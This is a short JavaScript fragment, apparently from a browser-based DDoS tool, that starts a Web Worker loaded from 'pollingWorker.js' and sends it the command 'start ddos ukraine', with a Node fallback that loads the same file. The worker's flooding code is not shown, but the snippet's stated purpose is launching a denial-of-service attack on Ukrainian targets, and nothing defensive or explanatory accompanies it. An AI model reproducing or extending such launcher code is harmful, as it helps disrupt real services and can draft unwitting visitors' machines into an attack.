if (window.Worker) {
  var pollingWorker = new Worker('pollingWorker.js');
  pollingWorker.postMessage('start ddos ukraine');
} else {
  var poll = require('./pollingWorker.js')
}